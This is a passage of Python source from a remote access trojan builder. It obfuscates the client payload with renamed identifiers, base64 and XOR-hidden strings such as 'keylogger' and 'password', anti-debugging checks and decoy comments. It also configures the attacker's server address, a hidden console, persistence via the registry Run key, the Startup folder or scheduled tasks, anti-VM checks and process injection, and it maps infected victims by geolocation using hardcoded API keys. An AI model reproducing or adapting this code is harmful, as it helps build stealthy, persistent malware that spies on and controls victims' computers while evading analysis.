                    'cpu_percent', 'attrs', 'limit', 'version', 'value', 'encoding', 'processes', 'type', 'rel_y',
                    'rel_x', 'startup_items', 'client_socket', 'control_socket', 'udp_socket', 'users', 'hostname', 'command',
                    'install_date', 'cursor', 'number', 'data', 'bookmarks', 'cookies', 'mutex', 'on_press', 'daemon', 'stop',
                    'store', 'status', 'maxlen', 'level', 'args', 'transfer_speed', 'avg_fps', 'min_quality', 'max_scale', 'target_fps',
                    'current_fps', 'quality', 'control_active', 'control_port', 'control_thread', 'control_listener', 'buffer', 'cmd_end',
                    'response', 'process_command', 'parts', 'cmd_type', 'screen_height', 'action', 'button', 'amount', 'OK', 'KEY', 'backlog_lock',
                    'dport', 'sport', 'dst_ip', 'src_ip', 'prn', 'protocol', 'packet', 'total_packets', 'total_bytes', 'protocols', 'connections',
                    'bytes_since_last', 'packets_since_last', 'time_diff', 'destination', 'port', 'bytes', 'threshold', 'type', 'high_traffic',
                    'port_count', 'ports', 'packets', 'suspicious', 'avg_size', 'total_dns_traffic', 'dns_connections', 'data_size', 'send_time',
                    'timestamp', 'resolution_scale', 'recent_send_times', 'increasing_trend', 'congestion_detected', 'avg_send_time_short', 'increment',
                    'second_half', 'first_half', 'recent_bitrates', 'bitrate_ratio', 'avg_bitrate_short', 'target_bitrate', 'frame_count',
                    'avg_bitrate_long', 'avg_send_time_long', 'time_series', 'total_bytes_sent', 'current_bitrate', 'current_timestamp',
                    'current_target', 'frame'
                ]
                
                # Find all function and variable names to replace
                function_pattern = r'def\s+([a-zA-Z_][a-zA-Z0-9_]*)'
                variable_pattern = r'([a-zA-Z_][a-zA-Z0-9_]*)\s*='

                
                functions = set(re.findall(function_pattern, code))
                variables = set(re.findall(variable_pattern, code))
                
                # Filter out preserved names and short names
                functions = [f for f in functions if f not in preserved and len(f) > 3]
                variables = [v for v in variables if v not in preserved and len(v) > 3]
                
                # Create random replacements
                replacements = {}
                for name in functions + variables:
                    if name not in replacements and name not in preserved:
                        # Use confusing names with similar characters
                        obf_chars = "OQIlRPXEAZ"
                        obf_name = ''.join(random.choice(obf_chars) for _ in range(random.randint(5, 8)))
                        replacements[name] = obf_name
                
                # print(replacements)
                # Replace the names
                for original, obfuscated in replacements.items():
                    # Use word boundaries to avoid partial replacements
                    pattern = r'\b' + re.escape(original) + r'\b'
                    code = re.sub(pattern, obfuscated, code)
            
            # Level 2: String encoding and code structure changes
            if level >= 2:
                self.log_message("Level 2: String encoding and code structure changes...")
                
                # Add base64 import if not already there
                if 'import base64' not in code:
                    code = 'import base64\n' + code
                
                # First, handle f-strings differently
                # Find all f-strings and temporarily replace them
                fstring_pattern = r'f"([^"\\]*(\\.[^"\\]*)*)"'
                fstrings = re.findall(fstring_pattern, code)
                fstring_placeholders = {}
                
                for i, fstring in enumerate(fstrings):
                    placeholder = f"__FSTRING_PLACEHOLDER_{i}__"
                    fstring_content = fstring[0]
                    fstring_placeholders[placeholder] = f'f"{fstring_content}"'
                    code = code.replace(f'f"{fstring_content}"', placeholder)
                
                # Preserve multi-line comments and docstrings
                docstring_pattern = r'"""(.*?)"""'
                docstrings = []
                
                def save_docstring(match):
                    docstrings.append(match.group(0))
                    return f"__DOCSTRING_PLACEHOLDER_{len(docstrings)-1}__"
                
                code = re.sub(docstring_pattern, save_docstring, code, flags=re.DOTALL)
                
                # First, process assignment operations to prevent syntax errors
                # Find variable assignments with string literals
                assignment_pattern = r'([a-zA-Z_][a-zA-Z0-9_]*)\s*=\s*(r?b?)(".*?")'
                
                def process_assignment(match):
                    var_name = match.group(1)
                    prefix = match.group(2)
                    string_literal = match.group(3)
                    
                    # Skip empty strings
                    if string_literal == '""' or string_literal == "''":
                        return f"{var_name} = {prefix}{string_literal}"
                    
                    # Extract content without quotes
                    content = string_literal[1:-1]
                    encoded = base64.b64encode(content.encode('utf-8')).decode('utf-8')
                    
                    if prefix == 'b':
                        return f"{var_name} = base64.b64decode(\"{encoded}\".encode(\"utf-8\"))"
                    else:
                        return f"{var_name} = base64.b64decode(\"{encoded}\").decode(\"utf-8\")"
                
                # Process assignments first
                code = re.sub(assignment_pattern, process_assignment, code)
                
                # Now encode all other string literals
                string_pattern = r'(r?b?)"([^"\\]*(\\.[^"\\]*)*)"'
                
                def encode_string(match):
                    prefix = match.group(1)  # Captures 'r', 'b', 'rb', or empty string
                    s = match.group(2)
                    
                    # Special handling for empty strings
                    if s == "":
                        if prefix == 'b':
                            return f'b""'
                        elif prefix == 'r':
                            return f'r""'
                        elif prefix == 'rb' or prefix == 'br':
                            return f'rb""'
                        else:
                            return f'""'
                    
                    # Normal handling for non-empty strings
                    encoded = base64.b64encode(s.encode('utf-8')).decode('utf-8')
                    
                    # Handle different string prefixes
                    if prefix == 'b':
                        # Byte string
                        return f'base64.b64decode("{encoded}".encode("utf-8"))'
                    elif prefix == 'r':
                        # Raw string
                        return f'base64.b64decode("{encoded}").decode("utf-8")'
                    elif prefix == 'rb' or prefix == 'br':
                        # Raw byte string
                        return f'base64.b64decode("{encoded}".encode("utf-8"))'
                    else:
                        # Regular string
                        return f'base64.b64decode("{encoded}").decode("utf-8")'
                
                # Replace remaining string literals with encoded versions
                code = re.sub(string_pattern, encode_string, code)
                
                # Restore f-strings
                for placeholder, fstring in fstring_placeholders.items():
                    code = code.replace(placeholder, fstring)
                
                # Restore docstrings
                for i, doc in enumerate(docstrings):
                    code = code.replace(f"__DOCSTRING_PLACEHOLDER_{i}__", doc)
                
                # Add some junk functions that never get called
                junk_functions = [
                    '\ndef _' + ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(8)) + '():\n    return "' +
                    ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(20)) + '"\n'
                    for _ in range(5)
                ]
                code = code + '\n' + '\n'.join(junk_functions)
                
                # Add code flow obfuscation
                code = code.replace("if __name__ == \"__main__\":", 
                                f"""
    _x = lambda: None
    _y = lambda: main()
    if __name__ == "____main__" + "_"[0]:
        _vars = {{
            "x": _x,
            "y": _y
        }}
        _vars["y"]()
    """)
            
            # Level 3: [Code for level 3 stays the same]
            if level >= 3:
                self.log_message("Level 3: Adding encryption layer and anti-analysis techniques...")
                
                # Add anti-debugging code
                anti_debug_code = """
def _check_debugger():
    import ctypes
    import sys
    import time
    import random
    
    # Simple timing check (debuggers affect execution time)
    start = time.time()
    for i in range(1000):
        random.random()
    end = time.time()
    
    if end - start > 0.1:  # Execution took too long (might be debugged)
        sys.exit(0)
    
    # Check for debugger on Windows
    if hasattr(sys, 'gettrace') and sys.gettrace() is not None:
        sys.exit(0)
        
    try:
        if sys.platform == 'win32':
            is_debugged = ctypes.windll.kernel32.IsDebuggerPresent()
            if is_debugged:
                sys.exit(0)
    except:
        pass

    # Check for debugger periodically
    import threading
    def _periodic_check():
        while True:
            _check_debugger()
            time.sleep(30)
            
    threading.Thread(target=_periodic_check, daemon=True).start()
_check_debugger()
    """
                
                # Add the anti-debug code near the top after imports
                import_section_end = 0
                for line_idx, line in enumerate(code.split('\n')):
                    if not line.strip().startswith(('import ', 'from ')) and import_section_end > 5:
                        break
                    import_section_end = line_idx + 1
                
                code_lines = code.split('\n')
                code_lines.insert(import_section_end, anti_debug_code)
                code = '\n'.join(code_lines)
                
                # Add simple XOR encryption for sensitive strings
                xor_function = """
def _x(s, k=13):
    return ''.join(chr(ord(c) ^ k) for c in s)
    """
                code = xor_function + code
                
                # Replace some sensitive strings with XOR encrypted versions
                sensitive_strings = [
                    "127.0.0.1", "localhost", "socket", "connect", "screenshot", 
                    "keylogger", "audio", "command", "process", "network", "browser",
                    "cookie", "password", "clipboard"
                ]
                
                for string in sensitive_strings:
                    if f'"{string}"' in code:
                        # XOR encrypt the string
                        encrypted = ''.join(chr(ord(c) ^ 13) for c in string)
                        code = code.replace(f'"{string}"', f'_x("{encrypted}")')
                
                # Add multiple layers of junk code and misleading comments
                junk_code = [
                    '\n# Firewall configuration manager',
                    '\n# System performance optimizer',
                    '\n# Connection pooling service',
                    '\n# Database connector initialization',
                    '\n# Certificate validation module',
                    '\n# Network drive mapper',
                    '\n# Print job manager'
                ]
                
                for junk in junk_code:
                    # Insert at random positions
                    lines = code.split('\n')
                    pos = random.randint(10, len(lines) - 10)
                    lines.insert(pos, junk)
                    code = '\n'.join(lines)
                
            return code
        
        except Exception as e:
            self.log_message(f"Error during obfuscation: {e}", is_error=True)
            # If obfuscation fails, return original code
            return original_code
            
    def customize_client_code(self):
        """Customize the client code with current settings"""
        self.log_message("Customizing client code...")
        import re
        # Start with the template
        code = self.client_code
        
        # Replace server connection settings
        code = code.replace('SERVER_IP = "127.0.0.1"', f'SERVER_IP = "{self.build_options["host"]}"')
        code = code.replace('SERVER_PORT = 4444', f'SERVER_PORT = {self.build_options["port"]}')
        
        # def fix_escape_sequences(match):
        #     """Replace invalid escape sequences"""
        #     full_match = match.group(0)
            
        #     # List of valid escape sequences
        #     valid_escapes = ['\\n', '\\t', '\\r', '\\b', '\\f', '\\\\', '\\"', '\\\'']
            
        #     # If it's not a valid escape, replace the backslash
        #     if full_match not in valid_escapes:
        #         print(f"Fixing invalid escape sequence: {full_match}")
        #         return full_match.replace('\\', r'\\')
            
        #     return full_match
        
        # try:
        #     code = re.sub(r'\\[^ntrbf\\\'"()]', fix_escape_sequences, code)
        # except Exception as e:
        #     self.log_message(f"Error fixing escape sequences: {e}", is_error=True)
        
        try:
            code = code.encode('utf-8', errors='ignore').decode('utf-8')
        except Exception as e:
            self.log_message(f"Error encoding code: {e}", is_error=True)
            
        # Configure stealth options
        hide_console = str(self.build_options["hide_console"])
        persistence = str(self.build_options["persistence"])
        add_to_startup = persistence
        
        # If it has this configuration section, modify it
        if "# Configuration" in code and "HIDE_CONSOLE = False" in code:
            code = code.replace('HIDE_CONSOLE = False', f'HIDE_CONSOLE = {hide_console}')
            code = code.replace('ADD_TO_STARTUP = False', f'ADD_TO_STARTUP = {add_to_startup}')
            
            if self.build_options["anti_vm"]:
                code = code.replace('REQUEST_ADMIN = False', 'REQUEST_ADMIN = True')
        else:
            # Otherwise we'll need to add the configuration
            config_code = f'''
# Configuration
HIDE_CONSOLE = {hide_console}  # Set to True to hide console window
ADD_TO_STARTUP = {add_to_startup}  # Set to True to add to startup
REQUEST_ADMIN = {str(self.build_options["anti_vm"])}  # Set to True to request admin privileges
'''
            # Insert after imports if possible
            if "import" in code:
                # Find the last import statement
                lines = code.split('\n')
                last_import_idx = 0
                for i, line in enumerate(lines):
                    if line.strip().startswith(('import ', 'from ')):
                        last_import_idx = i
                
                # Insert after the last import
                lines.insert(last_import_idx + 1, config_code)
                code = '\n'.join(lines)
            else:
                # Just add at the beginning if we can't find imports
                code = config_code + code
        
        # Customize persistence method if enabled
        if self.build_options["persistence"]:
            method = self.build_options["persistence_method"]
            startup_name = self.build_options["startup_name"]
            
            # Add or modify persistence code
            if "def run_on_startup():" in code:
                # Replace the existing startup method
                if method == "registry":
                    persistence_code = fr'''
    try:
        if os.name == 'nt':  # Windows
            # Get the path to the current script
            script_path = os.path.abspath(sys.argv[0])
            
            # Add to registry for startup
            import winreg
            key_path = r'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "{startup_name}", 0, winreg.REG_SZ, script_path)
            winreg.CloseKey(key)
            
        print("[*] Added to startup successfully")
        
    except Exception as e:
        print(f"[!] Error adding to startup: {{e}}")'''
                
                elif method == "startup_folder":
                    persistence_code = rf'''
    try:
        if os.name == 'nt':  # Windows
            # Get the path to the current script
            script_path = os.path.abspath(sys.argv[0])
            
            # Copy to startup folder
            startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
            startup_file = os.path.join(startup_folder, "{startup_name}.lnk")
            
            # Create shortcut
            import win32com.client
            shell = win32com.client.Dispatch("WScript.Shell")
            shortcut = shell.CreateShortCut(startup_file)
            shortcut.Targetpath = script_path
            shortcut.WorkingDirectory = os.path.dirname(script_path)
            shortcut.IconLocation = script_path
            shortcut.save()
            
        print("[*] Added to startup folder successfully")
        
    except Exception as e:
        print(f"[!] Error adding to startup folder: {{e}}")'''
                
                elif method == "scheduled_task":
                    persistence_code = rf'''
    try:
        if os.name == 'nt':  # Windows
            # Get the path to the current script
            script_path = os.path.abspath(sys.argv[0])
            
            # Create scheduled task
            task_name = "{startup_name}"
            os.system(f'schtasks /create /tn "{{task_name}}" /sc onlogon /tr "{{script_path}}" /rl highest /f')
            
        print("[*] Added scheduled task successfully")
        
    except Exception as e:
        print(f"[!] Error adding scheduled task: {{e}}")'''
                
                # Replace the function content
                import re
                code = re.sub(r'def run_on_startup\(\):.*?(?=\n[a-zA-Z]|\n\s*$|\Z)', 
                             f'def run_on_startup():{persistence_code}\n\n', 
                             code, 
                             flags=re.DOTALL)
        
        # Add mutex if requested
        if self.build_options["mutex_enabled"]:
            mutex_name = self.build_options["mutex_name"]
            
            # Check if main function exists and add mutex code
            if "if __name__ == \"__main__\":" in code:
                mutex_code = rf'''
    # Check for existing instance with mutex
    if os.name == 'nt':  # Windows
        mutex = ctypes.windll.kernel32.CreateMutexA(None, False, b"{mutex_name}")
        if ctypes.windll.kernel32.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
            print("Another instance is already running. Exiting.")
            sys.exit(0)
'''
                # Insert mutex code at the beginning of main block
                code = code.replace("if __name__ == \"__main__\":", 
                                   f"if __name__ == \"__main__\":{mutex_code}")
            
        # Add anti-VM code if requested
        if self.build_options["anti_vm"]:
            anti_vm_code = r'''
def is_running_in_vm():
    try:
        if os.name == 'nt':  # Windows
            import winreg
            
            vm_keys = [
                (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\\CurrentControlSet\\Services\\VBoxService"),
                (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\\CurrentControlSet\\Services\\vmtools"),
                (winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0")
            ]
            
            for root_key, key_path in vm_keys:
                try:
                    key = winreg.OpenKey(root_key, key_path)
                    winreg.CloseKey(key)
                    return True
                except:
                    pass
                    
            vm_processes = ["vboxservice.exe", "vmtoolsd.exe", "vmwaretray.exe", "vmusrvc.exe"]
            for proc in psutil.process_iter(['name']):
                try:
                    if proc.info['name'].lower() in vm_processes:
                        return True
                except:
                    pass
                    
        if os.path.exists("/.dockerenv") or os.path.exists("/proc/self/cgroup"):
            with open("/proc/self/cgroup", "r") as f:
                if "docker" in f.read():
                    return True
        
        return False
    except:
        return False

'''
            
            if "def main()" in code:
                lines = code.split('\n')
                main_idx = 0
                for i, line in enumerate(lines):
                    if line.strip().startswith(('def main()')):
                        last_import_idx = i
                
                # Insert after the last import
                lines.insert(last_import_idx - 1, anti_vm_code)
                code = '\n'.join(lines)
            
            # Add check in main
            if "if __name__ == \"__main__\":" in code:
                anti_vm_check = r'''
    # Exit if running in VM
    if is_running_in_vm():
        print("Running in virtual environment. Exiting.")
        sys.exit(0)
'''
                # Insert anti-VM check at the beginning of main block
                if "# Check for existing instance with mutex" in code:
                    # Add after mutex check
                    code = code.replace("# Check for existing instance with mutex",
                                       f"# Check for existing instance with mutex{anti_vm_check}")
                else:
                    # Add at beginning of main block
                    code = code.replace("if __name__ == \"__main__\":", 
                                       f"if __name__ == \"__main__\":{anti_vm_check}")
        
        if self.build_options.get("process_injection", False):
            injection_code = self.generate_injection_code()
            
            # Find a suitable place to insert the injection code
            if "def main():" in code:
                # Add before main function
                code = code.replace("def main():", f"{injection_code}\n\ndef main():")
            else:
                # Add after imports
                import_section_end = 0
                for line_idx, line in enumerate(code.split('\n')):
                    if not line.strip().startswith(('import ', 'from ')) and import_section_end > 5:
                        break
                    import_section_end = line_idx + 1
                
                code_lines = code.split('\n')
                code_lines.insert(import_section_end, injection_code)
                code = '\n'.join(code_lines)
            
            # Modify main to use process injection
            if "if __name__ == \"__main__\":" in code:
                # Add injection call to main
                injection_main_code = """
    # Start process injection
    if not inject_into_process():
        print("[!] Process injection failed, falling back to normal execution")
        
    """
                code = code.replace("if __name__ == \"__main__\":", 
                                f"if __name__ == \"__main__\":{injection_main_code}")
        return code
        
    def comment_out_section(self, code, start_marker, end_marker):
        """Comment out a section of code based on markers"""
        lines = code.split('\n')
        in_section = False
        indentation = ""
        modified_lines = []
        
        for line in lines:
            # Check if we're entering the section
            if not in_section and start_marker in line:
                in_section = True
                indentation = " " * (len(line) - len(line.lstrip()))
                
                # Add commented version
                modified_lines.append(f"{indentation}# {line.lstrip()}")
            # Check if we're exiting the section
            elif in_section and end_marker in line:
                modified_lines.append(f"{indentation}# {line.lstrip()}")
                
                # Check if this is a class/function definition
                if line.strip().startswith(("def ", "class ")):
                    # Add an empty implementation
                    if "def " in line:
                        # For functions
                        modified_lines.append(f"{indentation}def {line.split('def ')[1].split('(')[0]}(*args, **kwargs):")
                        modified_lines.append(f"{indentation}    pass")
                    else:
                        # For classes
                        modified_lines.append(f"{indentation}class {line.split('class ')[1].split('(')[0]}:")
                        modified_lines.append(f"{indentation}    def __init__(self, *args, **kwargs):")
                        modified_lines.append(f"{indentation}        pass")
                
                in_section = False
            # We're inside the section to comment out
            elif in_section:
                modified_lines.append(f"{indentation}# {line.lstrip()}")
            # Outside any section to comment
            else:
                modified_lines.append(line)
        
        return '\n'.join(modified_lines)


class EnhancedClientGeoMapping:
    """Enhanced geographic mapping component for RAT clients with improved precision"""
    
    def __init__(self, parent, rat_app):
        self.parent = parent
        self.rat_app = rat_app
        self.client_locations = {}  # Store client locations {client_id: {"lat": lat, "lon": lon, "info": {...}}}
        self.ip_cache = {}  # Cache for IP->location lookups
        self.cache_expiry = {}  # Store expiration times for cached IPs
        
        # Default cache expiration (24 hours in seconds)
        self.cache_expiration_time = 86400
        
        # API keys for geolocation services
        # Note: These are placeholders - you'll need to sign up for these services
        self.ipstack_api_key = "0c84ae78bf00f2eeb7280af1803f93d5"  
        self.ipinfo_token = "58950d8a1c1383"
        self.ipgeolocation_api_key = "df6c850929e54ae1801e2472127b1a8c"
        self.ipapi_key = "YOUR_IPAPI_KEY"
        
        # Additional options
        self.allow_local_ip_lookup = True  # Set to False to disable public IP lookup for local IPs
        self.debug = True  # Enable debug output for troubleshooting
        self.use_https = True  # Use HTTPS for API requests (more secure)
        self.precision_threshold = 1000  # City-level precision in meters
        
        # Location confidence levels
        self.confidence_levels = {
            "high": 3,    # Multiple sources agree, precision data available
            "medium": 2,  # Single trusted source with good precision
            "low": 1,     # Best-effort location (approximate)
            "unknown": 0  # Default, no reliable data
        }
        
        # Initialize services status to track API availability
        self.services_status = {
            "ipstack": {"available": True, "last_error": None, "error_count": 0},
            "ipinfo": {"available": True, "last_error": None, "error_count": 0},
            "ipgeolocation": {"available": True, "last_error": None, "error_count": 0},
            "ipapi": {"available": True, "last_error": None, "error_count": 0},
            "freegeoip": {"available": True, "last_error": None, "error_count": 0}
        }
        
        # Setup the UI
        self.setup_ui()
        
        # Initialize requests library
        try:
            import requests
            self.requests_available = True
        except ImportError:
            self.requests_available = False
            self.log_message("Warning: requests library not available. Using fallback HTTP methods.", is_error=True)

    def get_theme_colors(self):
        """Get the current theme colors from the rat_app."""
        theme_name = self.rat_app.current_theme
        if hasattr(self.rat_app, 'theme_manager') and self.rat_app.theme_manager is not None:
            return self.rat_app.THEMES[theme_name]
        else:
            return self.rat_app.THEMES[theme_name]
            
    
    def setup_ui(self):
            """Set up the geographic mapping tab UI with brutalist modern aesthetic"""
            # Import required modules
            import tkinter as tk
            import customtkinter as ctk
            from tkinter import ttk
            import os
            import json
            
            # Get theme colors
            theme = self.get_theme_colors()
            
            # Create main frame for the map tab
            self.map_frame = ctk.CTkFrame(self.parent, fg_color=theme["bg_color"])
            self.parent.add(self.map_frame, text="Geographic Map")  # All caps for tab name
            
            # Control panel at the top with brutalist styling
            control_frame = ctk.CTkFrame(self.map_frame, 
                                    fg_color=theme["card_color"],
                                    corner_radius=0,  # Square corners
                                    border_color=theme["border_color"] if "border_color" in theme else None,
                                    border_width=1 if "border_color" in theme else 0)
            control_frame.pack(fill=tk.X, padx=10, pady=10)
            
            # Store map buttons for theme updates
            self.map_buttons = []
            
            # Map refresh button with brutalist styling
            refresh_btn = ctk.CTkButton(control_frame, text="REFRESH MAP",  # All caps
                                    command=self.refresh_map,
                                    fg_color=theme["button_color"],
                                    hover_color=theme["hover_color"],
                                    text_color=theme["fg_color"],
                                    border_color=theme["border_color"] if "border_color" in theme else None,
                                    border_width=1 if "border_color" in theme else 0,
                                    corner_radius=0,  # Square corners
                                    height=30)  # Taller button
            refresh_btn.pack(side=tk.LEFT, padx=10, pady=10)
            self.map_buttons.append(refresh_btn)
            
            # Precision scan button with brutalist styling
            precision_btn = ctk.CTkButton(control_frame, text="PRECISION SCAN",  # All caps
                                    command=self.perform_precision_scan,
                                    fg_color=theme["button_color"],
                                    hover_color=theme["hover_color"],
                                    text_color=theme["fg_color"],
                                    border_color=theme["border_color"] if "border_color" in theme else None,
                                    border_width=1 if "border_color" in theme else 0,
                                    corner_radius=0,  # Square corners
                                    height=30)  # Taller button
            precision_btn.pack(side=tk.LEFT, padx=10, pady=10)
            self.map_buttons.append(precision_btn)
            
            # Map provider selection with brutalist styling
            provider_label = ctk.CTkLabel(control_frame, text="MAP PROVIDER:",  # All caps
                                        text_color=theme["fg_color"])
            provider_label.pack(side=tk.LEFT, padx=(20, 5), pady=10)
            
            self.provider_var = tk.StringVar(value="OpenStreetMap")
            provider_menu = ctk.CTkOptionMenu(control_frame, 
                                            values=["OpenStreetMap", "Mapbox", "Google Maps", "ESRI"],
                                            variable=self.provider_var,
                                            command=self.change_map_provider,
                                            fg_color=theme["button_color"],
                                            button_color=theme["accent_color"],
                                            button_hover_color=theme["hover_color"],
                                            dropdown_fg_color=theme["card_color"],
                                            dropdown_hover_color=theme["hover_color"],
                                            dropdown_text_color=theme["fg_color"],
                                            text_color=theme["fg_color"],
                                            corner_radius=0)  # Square corners
            provider_menu.pack(side=tk.LEFT, padx=5, pady=10)
            
            # Map type selection with brutalist styling
            type_label = ctk.CTkLabel(control_frame, text="MAP TYPE:",  # All caps
                                    text_color=theme["fg_color"])
            type_label.pack(side=tk.LEFT, padx=(20, 5), pady=10)
            
            self.map_type_var = tk.StringVar(value="Street")
            type_menu = ctk.CTkOptionMenu(control_frame, 
                                        values=["Street", "Satellite", "Hybrid", "Terrain"],
                                        variable=self.map_type_var,
                                        command=self.change_map_type,
                                        fg_color=theme["button_color"],
                                        button_color=theme["accent_color"],
                                        button_hover_color=theme["hover_color"],
                                        dropdown_fg_color=theme["card_color"],
                                        dropdown_hover_color=theme["hover_color"],
                                        dropdown_text_color=theme["fg_color"],
                                        text_color=theme["fg_color"],
                                        corner_radius=0)  # Square corners
            type_menu.pack(side=tk.LEFT, padx=5, pady=10)
            
            # Geolocation options with brutalist styling
            geo_options_frame = ctk.CTkFrame(control_frame, fg_color="transparent")
            geo_options_frame.pack(side=tk.RIGHT, padx=10, pady=10)
            
            # Precision level selection
            precision_label = ctk.CTkLabel(geo_options_frame, text="PRECISION:",  # All caps
                                        text_color=theme["fg_color"])
            precision_label.pack(side=tk.LEFT, padx=5)
            
            self.precision_var = tk.StringVar(value="Standard")
            precision_menu = ctk.CTkOptionMenu(geo_options_frame, 
                                            values=["High", "Standard", "Approximate"],
                                            variable=self.precision_var,
                                            command=self.change_precision_level,
                                            fg_color=theme["button_color"],
                                            button_color=theme["accent_color"],
                                            button_hover_color=theme["hover_color"],
                                            dropdown_fg_color=theme["card_color"],
                                            dropdown_hover_color=theme["hover_color"],
                                            dropdown_text_color=theme["fg_color"],
                                            text_color=theme["fg_color"],
                                            corner_radius=0)  # Square corners
            precision_menu.pack(side=tk.LEFT, padx=5)
            
            # Local IP handling options
            self.local_ip_var = tk.BooleanVar(value=self.allow_local_ip_lookup)
            local_ip_check = ctk.CTkCheckBox(geo_options_frame, text="Resolve local IPs", 
                                            variable=self.local_ip_var,
                                            command=self.toggle_local_ip_lookup,
                                            fg_color=theme["accent_color"],
                                            border_color=theme["border_color"] if "border_color" in theme else None,
                                            border_width=1 if "border_color" in theme else 0,
                                            text_color=theme["fg_color"],
                                            checkbox_height=20,  # Larger checkbox
                                            checkbox_width=20)
            local_ip_check.pack(side=tk.LEFT, padx=10)
            
            # Main map display area with brutalist styling
            self.map_container = ctk.CTkFrame(self.map_frame, 
                                        fg_color=theme["card_color"],
                                        corner_radius=0,  # Square corners
                                        border_color=theme["border_color"] if "border_color" in theme else None,
                                        border_width=1 if "border_color" in theme else 0)
            self.map_container.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
            
            # We'll set up the map differently depending on the library used
            try:
                import tkintermapview
                self.setup_tkinter_map()
                self.map_type = "tkinter"
            except ImportError:
                # Show a message about the missing library with brutalist styling
                missing_lib_frame = ctk.CTkFrame(self.map_container, 
                                            fg_color=theme["bg_color"],
                                            corner_radius=0,  # Square corners
                                            border_color=theme["border_color"] if "border_color" in theme else None,
                                            border_width=1 if "border_color" in theme else 0)
                missing_lib_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
                
                message_label = ctk.CTkLabel(
                    missing_lib_frame, 
                    text="TKINTERMAPVIEW LIBRARY NOT INSTALLED\n\nPlease install it using:\npip install tkintermapview",  # Partly all caps
                    font=ctk.CTkFont(size=14, weight="bold"),
                    justify=tk.CENTER,
                    text_color=theme["fg_color"]
                )
                message_label.pack(fill=tk.BOTH, expand=True)
                
                install_btn = ctk.CTkButton(
                    missing_lib_frame, 
                    text="TRY WEB-BASED MAP",  # All caps
                    command=self.setup_web_map,
                    fg_color=theme["accent_color"],
                    hover_color=theme["hover_color"],
                    text_color="#000000",  # Black text for contrast on accent color
                    border_color=theme["border_color"] if "border_color" in theme else None,
                    border_width=1 if "border_color" in theme else 0,
                    corner_radius=0,  # Square corners
                    height=35  # Taller button
                )
                install_btn.pack(pady=20)
                self.map_buttons.append(install_btn)
                
                self.map_type = "none"
            
            # Client information panel with brutalist styling
            info_frame = ctk.CTkFrame(self.map_frame, 
                                fg_color=theme["card_color"],
                                corner_radius=0,  # Square corners
                                border_color=theme["border_color"] if "border_color" in theme else None,
                                border_width=1 if "border_color" in theme else 0,
                                height=200)
            info_frame.pack(fill=tk.X, padx=10, pady=10)
            info_frame.pack_propagate(False)  # Prevent the frame from shrinking
            
            # Create a notebook for multiple info tabs with style that matches our theme
            self.info_notebook = ttk.Notebook(info_frame, style="Custom.TNotebook")
            self.info_notebook.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
            
            # Basic info tab with brutalist styling
            basic_info_frame = ctk.CTkFrame(self.info_notebook, fg_color=theme["bg_color"])
            self.info_notebook.add(basic_info_frame, text="BASIC INFO")  # All caps
            
            self.client_info_text = tk.Text(basic_info_frame, height=8, wrap=tk.WORD, 
                                        bg=theme["input_bg"] if "input_bg" in theme else theme["bg_color"],
                                        fg=theme["fg_color"],
                                        borderwidth=0,
                                        highlightthickness=1,
                                        highlightbackground=theme["border_color"] if "border_color" in theme else theme["accent_color"],
                                        insertbackground=theme["accent_color"],
                                        font=("Consolas", 10))  # Monospace font
            self.client_info_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
            self.client_info_text.insert(tk.END, "Select a client marker on the map to view details.")
            self.client_info_text.config(state=tk.DISABLED)
            
            # Advanced location tab with brutalist styling
            location_info_frame = ctk.CTkFrame(self.info_notebook, fg_color=theme["bg_color"])
            self.info_notebook.add(location_info_frame, text="LOCATION DETAILS")  # All caps
            
            self.location_info_text = tk.Text(location_info_frame, height=8, wrap=tk.WORD, 
                                        bg=theme["input_bg"] if "input_bg" in theme else theme["bg_color"],
                                        fg=theme["fg_color"],
                                        borderwidth=0,
                                        highlightthickness=1,
                                        highlightbackground=theme["border_color"] if "border_color" in theme else theme["accent_color"],
                                        insertbackground=theme["accent_color"],
                                        font=("Consolas", 10))  # Monospace font
            self.location_info_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
            self.location_info_text.insert(tk.END, "Detailed location information will appear here.")
            self.location_info_text.config(state=tk.DISABLED)
            
            # Status log tab with brutalist styling
            log_frame = ctk.CTkFrame(self.info_notebook, fg_color=theme["bg_color"])
            self.info_notebook.add(log_frame, text="LOCATION LOG")  # All caps
            
            self.log_text = tk.Text(log_frame, height=8, wrap=tk.WORD, 
                                bg=theme["input_bg"] if "input_bg" in theme else theme["bg_color"],
                                fg=theme["fg_color"],
                                borderwidth=0,
                                highlightthickness=1,
                                highlightbackground=theme["border_color"] if "border_color" in theme else theme["accent_color"],
                                insertbackground=theme["accent_color"],
                                font=("Consolas", 10))  # Monospace font
            self.log_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
            self.log_text.insert(tk.END, "Geolocation status logs will appear here.")
            self.log_text.config(state=tk.DISABLED)
            
            # Configure error tag for log with theme colors
            self.log_text.tag_configure("error", foreground=theme["danger_color"])
            
            # Register with theme manager if available
            self.register_with_theme_manager()
    
    def register_with_theme_manager(self):
            """Register widgets with the theme manager if available."""
            if hasattr(self.rat_app, 'theme_manager') and self.rat_app.theme_manager is not None:
                tm = self.rat_app.theme_manager
                
                # Register main frames
                tm.track_widget(self.map_frame)
                tm.track_widget(self.map_container)
                
                # Register notebook
                tm.track_widget(self.info_notebook, "notebook")
                
                # Register text fields
                tm.track_widget(self.client_info_text, "scrolledtext")
                tm.track_widget(self.location_info_text, "scrolledtext")
                tm.track_widget(self.log_text, "scrolledtext")
                
                # Register buttons
                for btn in getattr(self, 'map_buttons', []):
                    tm.track_widget(btn)
                    
    def update_map_buttons(self):
